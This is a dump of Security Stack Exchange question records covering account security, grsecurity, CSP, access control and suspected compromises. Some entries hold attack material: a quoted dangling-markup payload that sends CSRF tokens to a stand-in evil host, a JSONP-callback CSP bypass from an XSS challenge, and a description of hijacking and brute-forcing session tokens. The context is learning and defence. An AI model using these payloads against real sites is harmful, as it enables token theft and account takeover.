"147576","1","151054","","2017-01-07 07:15:51","","2","186","<p>From grsecurity <a href=""https://grsecurity.net/announce.php"" rel=""nofollow noreferrer"">announce</a> (August 26, 2015):</p>
<blockquote>
<p>The test series, unfit in our view for production use, will however continue to be available to the public to avoid impact to the Gentoo Hardened and Arch Linux communities</p>
</blockquote>
<p>Does versions available through Arch and Gentoo repos recommended to use? What are possible drawbacks?</p>
","37362","","106285","","2021-05-23 02:13:50","2021-05-23 02:13:50","Are grsecurity kernels available through Arch and Gentoo repos suitable for production?","<linux><grsecurity>","1","2","","","","CC BY-SA 4.0"
"215698","1","","","2019-08-21 15:48:13","","0","733","<p>I am new to bug hunting and i came across this website, so i came across this bug or atleast what i think is a bug so help me understand and tell me if i should consider it a vulnerability. </p>

<ol>
<li><p>The website i was testing was only using session tokens to authenticate a user, so my first question is, is it vulnerablity for a website to only check session tokens. I logged in on 2 accounts in 2 different browsers, attacker in firefox, victim in chrome, now from chrome i copied user's session token and in firfox i refreshed the url intercepted the request and replaced the session token of the attacker with victim, it logged me in victim's account could make changes in victim's account, now let me make this clear when i logout the session token expires so it was only working on active sessions, so is it a vulnerability to be able to login to someome's current active session with just a token, there were other tokens in the cookie but they were not doing anything, removing them made no difference. Now ignoring my rest of the points would you consider it a vulnerability on its own?</p></li>
<li><p>there was also no rate limit on how many times i could check session tokens, i checked 1000 wrong tokens and entered a right token at this the end and the response length changed so should i consider it a vulnerability that i could brute force live active sessions on a website</p></li>
<li><p>the length of the token was same, i tried it with different sessions, length was always same</p></li>
<li><p>Is it normal for a user to manipulate session token in requests  is it a vulnerability? I mean is related to idor vulnerability in anyway? </p></li>
</ol>

<p>There were also xss vulnerabilities that could allow me to get session token of the victim but i wanna ignore that part for now i want to understand a web application that gives access to anyone with valid session token no matter if they are on different devices with same token</p>

<p>Also if it is a vulnerability what would you call it?</p>

<p>I would also appreciate if you recommend a source to understand it better</p>
","215069","","215069","","2019-08-21 15:52:14","2019-08-21 16:37:12","Is a web app vulnerable if it only uses session token in cookie to authenticate a user","<authentication><web-application><session-management><account-security>","2","0","","","","CC BY-SA 4.0"
"147655","1","","","2017-01-08 03:36:13","","0","995","<p>I'm a little apprehensive that there is some unauthorized usage of my router or computer or phone. I have an Asus RT-AC66U, a macbook pro and an iPhone. I'm hoping someone here might be able to help. </p>

<p>I got a phone call from a ""no caller id"" a couple of weeks ago from some clearly scammers trying to get me to go to fastsupport.com and do something or other, I didn't, but I stayed on the phone with them for 10 minutes leading them on. A week or so later I got an email from Apple saying I needed to change my Apple ID password and security questions so I did, and then I needed to select my device from a list, and there was a device listed called ""Neftali Lira's iPhone"", definitely not mine but I thought it might have created a randomly generated option to ensure I picked the right device. Another week later I got overage notices from my ISP because I had used about 100gb more than normal this month. Sensing something was afoul I logged into iCloud and realized Neftali Lira's phone was still listed under my devices on find my iphone. I removed the device from my account, reset my phone to factory and restored my computer to a time machine backup from 3 months ago. Changed all my passwords, reset the router, changed its password. The next morning I got a phone call from a ""no caller id"", no one on the other end, so I hung up. I logged into my router to monitor traffic and noticed that 4.5gb had been downloaded and uploaded when I was not using the internet and the activity stopped the exact minute I got the phone call. Either very coincidental or very suspicious. </p>

<p>I did some research at this point, fastsupport.com is clearly a phishing scam, but I never downloaded anything from their website, only talked to them on the phone, I might have visited the website on my phone out of curiosity, I remember what it looks like but I can't remember from which device I looked at it, can they get into my devices from just a phone call or me visiting the site? My router, RT-AC66U has some old firmware that I was using and from what I've read I think was vulnerable, I was running: 3.0.0.4.374., I've just now updated to 3.0.0.4.380 and changed the passwords again. I don't know anything about this type of security stuff, does any of that seem suspect to anyone? Is it possible they got access to my data? Am I safe now? Thanks in advance for any help. </p>
","135634","","","","","2020-09-22 16:52:55","Did I get ""hacked""? Need help","<malware><router><account-security><scam>","2","5","","2020-10-03 11:44:18","","CC BY-SA 3.0"
"147812","1","147813","","2017-01-09 19:33:48","","1","2035","<p>I'm just asking if my host machine stays safe when browsing the dark web darknet using Tor on a virtual machine with bridge connection through the host machine ? Since the virtual machine will be using the same RAM with host machine, can a virus inside the VMware RAM affect the host machine? Like send the IP address of the host machine, open a port, open a backdoor etc? Will there be a difference in terms of the security to the host machine if it is either Linux or Windows ?</p>
","135794","","107935","","2017-01-09 20:15:56","2017-01-09 20:15:56","Does my host machine stay completely safe if I'm browsing the dark web using virtual box or vmware on bridge network connection?","<network><virtualization><security-theater><vmware><darknet>","1","1","","2017-01-10 07:20:59","","CC BY-SA 3.0"
"216025","1","216028","","2019-08-27 11:31:51","","2","470","<p>A lot of questions here are about the safety of passwords e.g a Login Password to an account on site X. But how can attackers get in the account when they have to guess the passwords? I know there is the ""brute-force"" method but most sites will simply lock the account, when there are  too many false tries. So how get hackers access to the account?</p>
","215435","","6253","","2019-08-27 11:50:27","2019-08-27 12:10:00","How do attacks on password locked accounts work?","<passwords><brute-force><account-security>","1","5","","","","CC BY-SA 4.0"
"216050","1","216055","","2019-08-27 17:41:50","","20","8143","<p>Unfortunately, someone stole my laptop (a MacBook) and I did not realize that for 48 hours. Now, this was a work laptop and my company's security team is going to wipe the laptop remotely as soon as it connects to the internet. Which is nice. </p>

<p>However, what I am worried about is more about what could happen in those first 48 hours.</p>

<ol>
<li>My passwords were all over the place (auto-fill on my browser, etc.)</li>
<li>My Evernote had some good amount of passwords</li>
</ol>

<p>What I am guessing is that since it was stolen from my car, someone stealing it was interested more into selling parts of it or wipe it off and re-sell it (the hardware, not the data). At least, I hope that.</p>

<p>Now, in the worst case scenario, assuming it was stolen by a person who is dedicatedly interested in data: What are their options? Can they really crack open a MacBook and get my data? </p>

<p>If so, what are my options?</p>
","66863","","56961","","2019-08-29 06:35:22","2019-08-29 06:35:22","Stolen MacBook: should I worry about my data?","<account-security><macos><physical-access><apple>","3","6","","","","CC BY-SA 4.0"
"148083","1","148357","","2017-01-11 21:11:35","","2","395","<p>Are there any Secure Authentication for NFS other than Kerberos?</p>
","66520","","","","","2017-05-15 06:47:27","Secure Authentication options for NFS","<authentication><account-security><kerberos><nfs><gssapi>","1","0","","","","CC BY-SA 3.0"
"216276","1","216289","","2019-08-30 17:32:10","","5","4567","<p>Typical computers with modern operating systems require log-on accounts with a user name and a password. Is it dangerous to reveal the user name of the log-on account to the public?</p>

<p>My research:
I have found these articles on Information Security Stack Exchange:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/4729/should-usernames-be-kept-secret#"">Should usernames be kept secret?</a></li>
<li><a href=""https://security.stackexchange.com/questions/47436/how-bad-is-exposing-valid-user-names"">How bad is exposing valid user names?</a></li>
<li><a href=""https://security.stackexchange.com/questions/98082/forgot-password-and-revealing-whether-account-exists"">Forgot password and revealing whether account exists</a></li>
</ul>

<p>Googling typically gets me back to the first two of these articles.
These answers show that on a website it may be bad to reveal the username for the website account, because it gives malicious users needed information to try to crack an account. The ""hacking"" is rendered easier because the bad guy already knows where on the internet to try the passwords to crack the website account.</p>

<p>This question pertains to a computer, not a website. The computer may be ""hidden"" behind a NAT router and theoretically (hopefully?) not directly accessible from the internet. Even if the user has port-forwarded remote-in software, one would have to know the internet address of the computer or the router, of which there's some 4 billion in the IPv4 space, and astronomically more in IPv6. Knowing where to start poking seems a lot harder.</p>

<p>The background:
I help on the Virtualbox forums (forums.virtualbox.org). When folks ask for help with their Virtualbox guests, we usually need a log file from the run of the VB guest where the problem was noticed. These log files contain paths to the files on the host PC that are used by the guest, and these files default to being stored in the user's home path:</p>

<ul>
<li>Windows: C:\Users{username}....</li>
<li>Linux: /home/{username}/...</li>
</ul>

<p>The logs therefore reveal the account user name to anyone who may download the log file. And everyone including non-authenticated visitors, can download log files. Some users obfuscate these path names because they feel that having their user names out on the web is bad.</p>

<p>Are they right? Is revealing the PC account user name bad? </p>
","215726","","","","","2021-11-12 11:59:13","Is revealing a PC account user name bad?","<account-security><internet><user-names>","4","3","","","","CC BY-SA 4.0"
"148183","1","","","2017-01-12 16:17:10","","1","200","<p>At the beginning of the year staff are required to attend a key signing party - after changing their keys. They are required to bring said keys on USB sticks, at the end of the party each member of staff should have a copy of each others key. There is a workstation available at the end too.</p>

<p>See, for me I can't see any disadvantages that couldn't be easily amended, such as forgetting their key, or forgetting to create a fresh key, they could both be easily solved within half an hour. Is there any reason to amend this? Is there a more secure/easier way to pass around public keys to one another?</p>
","136157","","","","","2017-01-12 21:15:43","Are there any actual disadvantages to a key signing party?","<public-key-infrastructure><key-exchange><account-security>","3","1","","","","CC BY-SA 3.0"
"216413","1","","","2019-09-02 16:56:04","","3","178","<p>Recently, the facebook page changed on my computer (on others from the same router, I get the regular page). I checked the ssl certificate, and it seems to be authentic, however, as the page does not look professionally designed, I am worried it is a man in the middle attack. How to be sure if it is legitimate or not ?</p>

<p><a href=""https://i.stack.imgur.com/21Zgq.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/21Zgq.jpg"" alt=""facebook login""></a></p>

<p>Certificate information : 
<a href=""https://i.stack.imgur.com/LsriU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LsriU.png"" alt=""enter image description here""></a></p>
","215886","","215886","","2019-09-02 17:24:13","2019-09-03 03:36:07","How to know if a web page is valid and not a man in the middle fake page?","<man-in-the-middle><account-security><facebook>","1","9","","","","CC BY-SA 4.0"
"216423","1","","","2019-09-02 19:45:22","","1","138","<p>I am looking for email providers with the following conditions for privacy.</p>

<p>email providers that:</p>

<ul>
<li>Are free.</li>
<li>Do not require JavaScript or other credentials for registration.</li>
<li>Provide an onion service.</li>
<li>Support PGP encryption and key management.</li>
<li>Have encrypted inboxes by default.</li>
<li>Are outside Fourteen Eyes jurisdictions -- especially the US jurisdiction.</li>
<li>Have desktop email compatibility with Mozilla Thunderbird.</li>
</ul>

<p>If you know of any email providers like this, I would appreciate it if you could let me know.</p>
","215896","","153494","","2019-09-02 20:07:48","2019-09-02 20:07:48","I'm looking for an email provider like this","<privacy><email><account-security><tor>","0","2","","2019-09-02 20:35:43","","CC BY-SA 4.0"
"148429","1","","","2017-01-15 10:14:39","","1","571","<p>I'm about to switch from Linux Mint to Debian. But before doing that I'm still looking into a few things to secure Debian.</p>

<p><strong>1)</strong>
The first thing I want is a kind of 'sandboxing' technology. This to separate/protect Firefox from the rest of my system, and another sandbox-thing to protect 'special documents'. I thought of a separated file manager (like a Dolphin alternative) which is sandboxed and encrypted; but that doesn't exist I guess.
It doesn't necessary really need to be sandboxing, but something secure which should make it hard for malware to jump from my browser to my system, and from my system to my files.</p>

<p>But to protect Firefox I've already looked into Firejail, SELinux, and AppArmor. The first one wasn't secure enough IMHO, and I read that SELinux was too complex to configure; so I guess I'd go just with AppArmor. Just that when my browser would get exploited the payload/malware can't enter my system.</p>

<p>TL;DR<br>
Is a kind of thing which would protect those specific files? I thought of encryption but that's unsecured when I decrypt it while working on the documents. And is AppArmor secure enough to protect Firefox?</p>

<p><strong>2)</strong>
Securing kernel with GrSecurity.
GrSecurity patches some vulnerabilities in the kernel by controlling memory etc. However, I couldn't really find a tutorial on how to install it on Debian.
They're were talking about installing Vanilla kernels, which are default unaltered kernels. But wouldn't this cause problems with Debian? Do those Vanilla kernels get updates as well, and do I need to compile those updated versions myself than each time?
And ain't the Debian-altered-Linux-kernel not better than the Vanilla one for running Debian.
And is there any tutorial about setting up GrSecurity on Debian? I looked at a few but they all use this kernel version linux-2.6.38.5 which is really old IMHO because we're now already having 3.x and 4.x.</p>

<p>TL;DR<br>
Are Vanilla kernels good, secure, and well and easily updated? Up-to-date tutorial on how to setup GrSecurity for Debian?</p>

<p>For the rest, I already read the Debian HowTo Security manual and will apply most of those things.
But I just still need to know those things about AppArmor, Sandboxing, and GrSecurity.</p>

<p><strong>TL;DR at all</strong></p>

<ul>
<li>Is AppArmor secure enough to protect Firefox</li>
<li>Is there a kind of encrypted sandboxed filemanager, if no; how to protect specific documents against malware/separate them from the system</li>
<li>Ain't replacing the default kernel of Debian with a Vanilla one a risk (harder to keep updated, not Debian-optimized, not getting same amount of patches,...)?</li>
<li>Up to date tutorial on setting up GrSecurity for Debian?</li>
</ul>

<p>Thanks!</p>
","99202","","","","","2017-01-15 10:14:39","Sandboxing applications and files in Debian & GrSecurity","<linux><selinux><apparmor><grsecurity>","0","4","","2017-01-15 18:56:50","","CC BY-SA 3.0"
"148509","1","148561","","2017-01-16 11:00:54","","1","410","<p>So, let's try to explain this as clearly as possible. 
I have three gmail accounts, A B and C. A and B share a long, random and secure password, never used anywhere else. Account C has a relatively weak password. Account C is not used for any relevant stuff. Account A appears as a mailto link in my personal website, constructed using javascript, but a bot with a javascript engine can acces it easily get it.</p>

<p>And that's what I thought happened, when three days ago email account A started being spammed with registrations to many websites and mailing lists around the world. I thought some bot grabbed my address so I created gmail account D and proceeded changing my most important accounts to use account D, and warning people and contacts to send me mail to D instead of A.</p>

<p>But today, a few hours ago, I received a push notification on my android phone saying 'Somebody has your password', with a supposed login from my country, but hundreds of km from my location. This happened to accounts B and C, but NOT to A and D. Now is when I start being worried.</p>

<p>Turns out, my computer started lagging randomly when playing some games a while ago, as if the hard drive was malfunctioning. I have two drives in RAID 1, and both pass SMART tests as healthy.</p>

<p>My paypal and bank accounts are fine. No harm has been aparently done, but I am worried my personal computer (running windows 10) got compromised and somebody is 'preparing the terrain' to finally strike. I enabled two factor authentication on my google accounts and changed the password for websites where i have card information stored.</p>

<p>So what should I do to be sure my accounts are not compromised? What are your thoughts on the matter? I am really busy right now and completely reinstalling the operating system on my computer right now would imply a hugue loss of time and lots of stress. I do not know much about personal security and hacking despite being a developer.</p>

<p>UPDATE: Thank you for the answers. The hacker finally striked. It turns out they hacked some personal account with my credit card stored in it which I forgotten I had, and charged a ~1500 euro bill. Fortunately I catched it in time, since I was checking all the mails in my account being spammed in case it was due to something like this. To be sure, I cancelled and reissued all my credit cards and asked/warned my bank. No money was ever charged because I cancelled everything in time.</p>

<p>I ran a benchmark in my computer and indeed there is a faulty drive, also ran a scan with my antivirus software and everything seems ok.</p>

<p>Turns out account A was also accessed from that IP, so that would be all three accounts accounts I have on my phone, while my phone was using 3G, so maybe my carrier assigned my phone a far away IP? I don't know if that's possible, but I have enabled 2 factor in all my gmail accounts, so I think I should be safe without erasing my hard drive. Other people sharing my wireless haven't had any problems for now. I know fully erasing my computer is the safest option, and also not using backups to restore, but that would mean hell for me during at least a couple of weeks.</p>
","136487","","136487","","2017-01-16 22:21:37","2017-01-16 22:21:37","May have been hacked, tips on how to proceed?","<gmail><windows-10><account-security>","1","3","","","","CC BY-SA 3.0"
"148641","1","","","2017-01-17 18:53:37","","0","131","<p>I have a case where the only data stored on the user account is his email address. My client wants to avoid complicated passwords because the audience is young.
Some of my colleagues still want to apply good security rules for the password. But anyway the login requires the email address/password combination (no username). </p>

<p>I mean: what are the benefits to highly secure an account which contains only the user's email address when the user needs to provide his email address to login anyway?</p>

<p>Thanks for your thoughts!
Marion.</p>
","136640","","","","","2017-01-17 20:08:26","How simple a password could be when the only account data is the email address?","<passwords><account-security>","2","3","","","","CC BY-SA 3.0"
"148770","1","","","2017-01-19 06:09:06","","-2","106","<p>My Employer has sent me a link related to setting up security questions for Microsoft Azure account. I clicked on the privacy link from that page which sent me to the following page:</p>

<p><a href=""https://www.microsoft.com/en-us/privacystatement/OnlineServices/Default.aspx"" rel=""nofollow noreferrer"">https://www.microsoft.com/en-us/privacystatement/OnlineServices/Default.aspx</a></p>

<p>This page has grammatical errors in it.  For example, the sentence:</p>

<pre><code>Customer Data will be used only to provide customer the Online Services
  including purposes compatible with providing those services
</code></pre>

<p>Microsoft and many other on-line sites have said that grammatical errors are a red flag indicating a scam to get information from you. How do I determine if I can trust a page that has errors or links to others with errors on it?</p>

<p>The fact that the page is a Microsoft URL doesn't preclude an attacker who has altered one of their webpages, so the fact that it is at www.microsoft.com is not sufficient to allow trust.</p>

<p>Basically, my question boils down to <strong>""If a major U.S. company can't reliably write good English grammar when communicating, how is bad grammar a valid flag for scammers?""</strong> </p>
","103542","","","","","2017-01-19 12:29:19","grammatical errors on privacy page linked from security web page","<web-service><account-security><scam>","2","2","","","","CC BY-SA 3.0"
"217992","1","","","2019-09-13 13:33:06","","0","94","<p>I've been tracking my budget the old way for a few years now by using excel spread sheets that have my checking account ledger, and monthly expenses broken down to categories. But I have noticed more people have moved to using apps to track their budget and some of these also connect to their bank accounts, which to me seems sketchy isn't this a big security risk? ( It was suggested I ask this question here from SE Personal finance and money)</p>
","217634","","","","","2019-09-13 13:33:06","Security risk of using a budgeting app connected to bank accounts","<account-security><budget>","0","4","","2019-09-13 14:49:01","","CC BY-SA 4.0"
"218042","1","","","2019-09-15 01:01:22","","0","363","<p>I'm trying an XSS challenge. I found an exploit that breaks CSP by using a JSONP callback. I can get an alert to pop up by putting something like:</p>

<pre><code>&lt;script src=""https://whitelisted.jsonp?callback=alert#1""&gt;&lt;/script&gt;
</code></pre>

<p>But I'm having trouble trying to get it to send an HTTP-request. I've tried putting functions changing <code>window.location</code>, but it doesn't seem to execute any of my anon functions.</p>
","217715","","98538","","2019-09-16 07:27:07","2019-09-16 07:27:07","How to make a HTTPrequest in JSONP callback?","<web-application><xss><json><content-security-policy><jsonp>","0","2","","","","CC BY-SA 4.0"
"149059","1","","","2017-01-21 22:31:53","","2","179","<p>I have a homework question that suggests that applying security and usability best practices isn't enough to create a secure and usable system. What am I missing? Why isn't this enough?</p>

<p>If I follow usability best practices will I end up with a usable system? I think yes.</p>

<p>If I follow security best practices will I end up with a secure system? I think yes also.</p>

<p>So what am I missing?</p>
","130996","","6253","","2017-01-22 13:34:49","2017-01-22 13:34:49","Why isn't applying security and usability best practices enough?","<usability><security-by-design>","2","4","","","","CC BY-SA 3.0"
"149138","1","149144","","2017-01-23 02:12:47","","2","579","<p>Is it a good idea in terms of security to reset your password every time you login and just fill your password with a bunch of random symbols, letters and words that you don't memorise?</p>

<p>Since passwords with larger entropy have better security, why not fill it with a long random string of symbols, words, numbers and simply use your email to reset it every time you try to login and afterwards delete the mail that they sent you for recovery. [Or SMS to phone]</p>

<p>What is the reason (security mainly) that this idea is not suggested much? [Excluding the fact that its troublesome to some people]</p>
","137063","","225940","","2020-02-16 08:16:30","2020-02-16 08:16:30","What are the security risks of resetting your password every time you login?","<password-management><one-time-password><account-security><data-recovery><password-reset>","1","4","","","","CC BY-SA 4.0"
"10361","1","10368","","2012-01-03 23:16:33","","18","3888","<p>Tripwire type intrusion detection systems supposedly protect your system from rootkits, by monitoring the checksums of important binaries for changes.  </p>

<p>Let's say I have tripwire configured to run nightly and installed it on a fresh non-rootkitted system.<br>
Then at noon today a skilled intruder installs a rootkit to my system.  </p>

<p>How do I know their rootkit hasn't replaced my tripwire with a tripwire impersonator; using a different set of public/private keys (and fake authentication binaries) that more or less replays the last files (readable with public key) to assure me that no checksums are changing (essentially just replaying known log files).  I guess I could notice that my private passphrase no longer works to open the private key; but I don't think it would be that difficult to let any password work (or just the first one typed in).  I guess I should be checking the file sizes/shasum/md5sum of tripwire with known values, but on my rootkitted system all those utilities could be compromised.</p>

<p>I'm looking at the documentation from <a href=""http://sourceforge.net/projects/tripwire/files/tripwire-src/2.3.0-docs-pdf/"">http://sourceforge.net/projects/tripwire/files/tripwire-src/2.3.0-docs-pdf/</a> and don't see how tripwire provides any extra security -- besides making the rootkit developers have to work a little harder (to mimic one extra utility as configured by the user).</p>

<p>In practice, I doubt I'd ever routinely boot off a live cd to check hashes safely; so I am wondering if it provides any safety or if its just security theater.</p>
","2568","","","","","2012-08-19 16:52:48","Tripwire - Is it security Theater?","<hash><ids><integrity><security-theater>","7","1","","","","CC BY-SA 3.0"
"218403","1","","","2019-09-21 05:47:06","","1","216","<p>I recently saw the app below in my phone. Have disabled it immediately when I saw it. Have no idea:</p>

<ul>
<li><p>what it is</p></li>
<li><p>why it's in my phone</p></li>
<li><p>how long it's been there</p></li>
<li><p>and how to uninstall it (there's no uninstall option as you see in the screenshot)</p></li>
</ul>

<p><a href=""https://i.stack.imgur.com/05Vij.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/05Vij.png"" alt=""enter image description here""></a></p>

<p>Just wonder if anyone has experienced this issue (probably with another app, but pretty much same situation), and whether it's a security issue?</p>

<p>A few days ago, I installed a camera monitoring app called Xmeye (landlord installed the security camera, and told me that I can use this app to connect to it). Immediately uninstall the app after the first run as:</p>

<ul>
<li><p>it's from China</p></li>
<li><p>it asks for access to phone call, contact, location (I did not grant it the access, so it did not even start. Though I did give it storage access)</p></li>
</ul>

<p>Not sure if there's any link between this Xmeye app and the above app.</p>

<p><a href=""https://security.stackexchange.com/questions/152303/android-no-name-app-without-the-ability-to-remove-it"">This</a> question is somehow similar, and the only answer suggests to disable all permissions for the suspicious app, but I found no permission for that one.</p>
","218108","","","","","2019-09-21 05:47:06","Suspicious Android app - install on its own - no uninstall option - name in Japanese","<malware><android><account-security>","0","3","","2019-09-21 06:59:00","","CC BY-SA 4.0"
"218528","1","218580","","2019-09-23 16:00:38","","0","1196","<p>Are there any off the shelf alternatives that come close to achieving the same results as Content Security Policy (CSP)? I understand the importance of CSP but it soon becomes unmanageable with inline script hashes and the inability to allow unsafe-inline and unsafe-eval per third-party domain. Also, managing the CSP would involve a developer with access to code and cannot be offloaded easily to non-developers (however, wrong this approach may seem, it seems to be what most companies prefer).</p>
","58811","","","","","2019-09-24 08:04:56","Content Security Policy (CSP) alternatives","<web-application><third-party><content-security-policy>","1","3","","","","CC BY-SA 4.0"
"149466","1","149471","","2017-01-26 07:53:45","","16","4517","<p>GitHub explains the problem with <code>img-src</code> in
<a href=""https://githubengineering.com/githubs-post-csp-journey/?utm_source=webopsweekly&amp;utm_medium=email"">""GitHub's post-CSP journey""</a>:</p>

<blockquote>
  <p>A tag with an unclosed quote will capture all output up to the next
  matching quote. This could include security sensitive content on the
  pages such as:</p>
  
  <p><code>&lt;img src='https://some-evil-site.com/log_csrf?html= &lt;form</code>
  <code>action=""https://github.com/account/public_keys/19023812091023""&gt; ...</code>
  <code>&lt;input type=""hidden"" name=""csrf_token"" value=""some_csrf_token_value""&gt;</code>
  <code>&lt;/form&gt;</code></p>
  
  <p>The resulting image element
  will send a request to
  <a href=""https://some_evilsite.com/log_csrf?html=...some_csrf_token_value"">https://some_evilsite.com/log_csrf?html=...some_csrf_token_value</a>....
  As a result, an attacker can leverage this dangling markup attack to
  exfiltrate CSRF tokens to a site of their choosing.</p>
</blockquote>

<p>How does this differ from pressing page-source on the page and sending the content manually? If it is just for pages where users can insert input, don't we have to prevent only those issues with inputs by adding validations to the input? Not prevent img src of other sources in all the code?</p>
","137438","","8715","","2017-01-26 14:24:08","2017-01-26 17:30:08","Why is CSP needed to protect against img-src leak?","<web-application><sql-injection><html><content-security-policy>","2","3","","","","CC BY-SA 3.0"
"149612","1","","","2017-01-27 13:35:13","","0","875","<p>Our organization has historically been very lax with Data Protection and compliance, and we have a number of POS sales positions serving the public and taking payments; both Cash, Chip and Pin and Debit/Credit transactions through an e-portal. </p>

<p>As we're in the UK, the pending 2018 GDPR Act will have huge consequences on Data and information security for us, and as an IT dept. one of our biggest challenges is preparing the organization for the changes, and enforcing best practices on our staff.</p>

<p>It's recently come to light that certain vendors will often be logged on to more than one machine, with a different user performing financial transactions whilst 'borrowing' a colleagues credentials (the colleague in question is aware of this, apparently it 'speeds things up' when they're busy).</p>

<p>Of course this removes our ability to trace and audit transactions, but strictly speaking, <strong>is this illegal</strong>?</p>

<p>If so, which party would be prosecuted for this? The individual 'borrowing' the credentials, the colleague who has 'loaned' their login credentials out, or us as a company (even if we are unaware of the practice)?</p>

<hr>

<p>I'm aware this crosses over with 'Law', but is more generally focused on IT protection practices so thought I'd post it here (don't want to cross-post). IF the community deems this off topic for this stack, could an admin kindly migrate it over to Law for me? </p>
","137564","","6253","","2017-12-14 15:35:01","2018-02-25 19:53:03","Under GDPR, is one user borrowing another's logged-in session for financial transactions illegal?","<legal><account-security><financial><gdpr>","1","5","","","","CC BY-SA 3.0"
"149674","1","","","2017-01-28 06:54:29","","5","4153","<p>Google <a href=""https://support.google.com/accounts/answer/183723"" rel=""noreferrer"">lets</a> you add a recovery phone number to your account because:</p>

<blockquote>
  <p>Your recovery phone is used to reach you in case we detect unusual activity in your account or you accidentally get locked out.</p>
</blockquote>

<p>Thing is, I'm not sure what scenarios they have in mind, but I don't see how I could ""accidentally"" lock myself out or forget this account's password. It's my main account; I use it on a daily basis. And as for ""unusual activity"", Google only seems to send a warning <em>after</em> someone has logged in, not before. But if someone hacks my account and log in to it, then it's going to take them 10 more seconds to remove the recovery phone, so by the time I even realize what happened, my phone is going to be useless.</p>

<p>So my question is, <em>if I'm following ""proper"" security practices</em> (i.e. my passwords are strong, I'm using a password manager and 2FA, etc.), then should I really ever have this enabled?<br>
The benefits seem to be minimal if any, and the downsides comparatively enormous (e.g. if someone steals my <em>phone</em>, that person is going to have another channel for attacking my Google account).</p>
","5613","","","","","2017-12-02 20:16:57","Does Google account's ""recovery phone"" have any benefit if I never forget my password?","<google><phone><account-security><recovery>","2","1","","","","CC BY-SA 3.0"
"218907","1","","","2019-09-30 23:16:27","","3","1693","<p>I understand how JWTs work and that with my secret anyone can issue new tokens. I control the server that my node website runs on and am considering different options for hosting the key.</p>

<ol>
<li>In code - Not acceptable because my code is in a github repo</li>
<li>ENV variable - seperate secrets for dev and production while not leaking to github</li>
<li>Store in database - Seems more like 2nd option with more work, being that an on-machine attacker can find access to the db anyways</li>
</ol>

<p>2nd option looks like the best method for a simple website (no super sensitive user info like credit cards or SSNs). </p>

<p>Is this a good solution?</p>
","218720","","95272","","2019-10-01 07:53:13","2020-03-29 09:02:35","Is storing a JWT secret as docker env variable acceptable?","<account-security><jwt><storage><token><node.js>","2","2","","","","CC BY-SA 4.0"
"149768","1","","","2017-01-29 19:01:09","","52","11104","<ul>
<li><p>SSH Server: I only allow public-key authentication.</p>
</li>
<li><p>Malicious Software: If it's running as my user it has access to my data and an internet connection, it's bad enough already. Yes, su access would make it worse, but the issue here is not password strength but having trusted a malicious application.</p>
</li>
<li><p>Physical Access: su access is irrelevant at this point, the attacker has physical access to my hard drive, so they can do as they wish.</p>
</li>
</ul>
<p>So, in what scenario does having a strong password that is error-prone to type help me?</p>
","24880","","6253","","2021-08-23 09:24:52","2021-08-23 09:24:52","Why does one need a strong password on Unix?","<passwords><malware><account-security><physical><unix>","6","8","","","","CC BY-SA 4.0"
"149781","1","","","2017-01-29 21:20:46","","2","1042","<p>So I've been reading up on MAC vs DAC vs RBAC and there is something which I do not understand. Everywhere you read, it tells you that these types are different (disjoint) but isn't RBAC just a type (implementation) of MAC?</p>

<p>From what I gather, MAC is a generic control policy in which the administrator manages all access rights. In RBAC, rights are assigned to roles but ultimately roles are still managed by the administrator right? The admin decides which user has which role and he is also the one which can change permission for all roles so ultimately the administrator is still the one managing all access rights, correct?</p>

<p>Also I've watched this video on YouTube <a href=""https://www.youtube.com/watch?v=o9aRHgHvdLY"" rel=""nofollow noreferrer"">Implementing MAC Example</a>, and this model worked as such: data was classified into categories according to its sensitivity (i.e. top secret, secret, confidential etc) and the company was divided into departments. The account control was implemented as a set of labels L = (sensitivity level, department) which meant that users from that department have rights on files of that sensitivity level. Very basic example, I know, but I don't understand how this is different from RBAC. The department of a user is basically his role and the labels show what rights each of the departments has. Honestly if I were to be asked ""what type of account control was presented in the video"" I would answer RBAC but the video claims it presents MAC.</p>

<p>Can someone shed some light on precisely what differs between the two and why one isn't just a subcategory of the other?</p>

<p>Thanks in advance.</p>
","137721","","764","","2017-01-29 21:23:56","2017-01-29 22:21:54","Isn't RBAC just an implementation of MAC?","<access-control><account-security><mandatory-access-control>","1","3","","","","CC BY-SA 3.0"
"149833","1","","","2017-01-30 10:41:26","","4","689","<p>It is a commonly accepted best security practice to disable remote <code>root</code> logins on *nix systems including Linux. Thus, in order to log in directly as root, you need to have physical access to a trusted console (in the case of many Linux systems, one listed in <code>/etc/securetty</code>).</p>

<p>As a consequence of the above, to gain root access remotely, you first need to break into an ordinary user's account, then <em>additionally</em> escalate to root access. In this case, the password on the root account only protects against a password-cracking attack on the root account, not any of the other multitude of possible ways for an attacker to escalate privileges.</p>

<p>Given that the system console should be physically secured anyway (even in most homes it's usually kept behind a locked door when unsupervised; many homes have burglar alarm systems installed; and even workstations in corporate locations are almost always either behind locked doors or in alarmed areas; servers even more so), and that if an attacker has physical access already file system permissions present barely an obstacle, <strong>why would the root account need a strong password?</strong> Couldn't we use a simple password for the root account more to protect against simple mistakes or casual attackers, than determined attackers?</p>
","2138","","","","","2017-03-01 16:10:04","Why should the *nix system administrator account (root) have a strong password if remote root logins are disabled?","<passwords><password-policy><account-security>","5","4","","","","CC BY-SA 3.0"
"219006","1","","","2019-10-03 07:13:25","","2","98","<p>Is the solution to preventing credential phising attacks is really only 'educating' people about it? </p>

<p>For the sake of this question, let us assume that I have a web application that takes a username and a password within a login form. Currently, as far as I know and could figure out, there is no way I can avoid an attacker phishing a vulnerable user of my web application into filling up a phished version of the login form prepared by an attacker. </p>
","152905","","37315","","2019-10-03 07:30:42","2019-10-03 07:36:29","Known methods/techniques for thwarting credential phising attacks","<authentication><web-application><account-security><phishing>","1","0","","","","CC BY-SA 4.0"
"149924","1","","","2017-01-31 11:07:00","","1","1233","<p>As MSDN subscribers all members of our development team need to have a Microsoft account. Since September 2016 these Microsoft accounts get disabled, temporarily or permanently, with no explanation from Microsoft.
For some of us the accounts were enabled back after confirming our identity using our mobile phones.
For these accounts, the activity page shows multiple successful logins from a location in Amsterdam. 
The first time it happened to me I've quickly generated a really long password using KeePass and, for a while, the ""Amsterdam logins"" went away.
Yesterday I've seen again one of these logins and one of my coworkers had again to prove his identity to get back access to his Microsoft account.
